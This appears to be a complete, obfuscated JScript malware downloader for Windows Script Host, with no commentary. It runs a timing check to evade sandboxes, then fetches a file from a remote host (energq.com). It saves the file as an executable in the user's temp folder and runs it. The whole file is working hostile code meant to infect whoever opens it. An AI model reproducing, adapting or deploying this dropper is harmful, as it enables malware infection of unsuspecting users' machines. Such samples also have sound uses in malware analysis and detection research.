var h = false;
var B0 = "CreateObject";
var cg = function a() {return WScript[B0]("WScript.Shell");}(), Vf = 11;
var O0 = "MSXML2.XMLHTTP";
var gP = 2123213;
var Zx = 0;
function lv(W){cg["Run"](W, Zx, Zx);};
function s(){return "" + O0;};
function Hh(J, K){Zx = Zx * 1; return J - K;};
function a0(){return B0;};
/*@cc_on
  @if (@_win32 || @_win64)
    h = true;
  @end
@*/
if (h)
{
var JA = "";
function z(){return 22;};
var Cf = 0; var P = 0;
function Zr()
{
var SP = new this["Date"]();
var yi = SP["getUTCMilliseconds"]();
WScript["Sleep"](z());
var SP = new this["Date"]();
var V = SP["getUTCMilliseconds"]();
WScript["Sleep"](z());
var SP = new this["Date"]();
var c = SP["getUTCMilliseconds"]();
var Cf = "Rt";
Cf = Hh(V, yi);
var P = "Z";
P = Hh(c, V);
JA = "open";
return Hh(Cf, P);
}
var RJ = false;
var ou = false;
for (var Nk = Zx; Nk < z() * 1; Nk++){if (Zr() != Zx){
RJ = true; 
P = "31" + 11 * Cf + P; 
ou = true; 
break;
}}
function TA() {return ((RJ == true) && (RJ == ou)) ? 1 : Zx;};
if (RJ && TA() && ou){
function O() {return cg["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "sqjDfGzx2EawBgz.exe";};
 UG = s();
 c0 = WScript[B0](UG);
 var B = 1;
 while (B){
try {
c0[JA]("GET", "http://energq.com/e3ola", false);
c0["send"]();
rQ = "Sleep";
for (;;){WScript[rQ](z() * 11); if (c0["readystate"] >= 2 * 2) break;};
B = Zx;
} catch(Bj){};
}
function Rm(j) {var e = (1, 2, 3, 4, 5, j); return e;};
No = WScript[a0()]("ADODB.Stream");
UG = No;
UG[JA]();
UG["type"] = Rm(1);
UG["write"](c0["ResponseBody"]);
No["position"] = Rm(Zx);
UG["Save" + "ToFile"](O(), 2);
No["c"+"lose"]();
EX = O();
lv(EX);
}
}

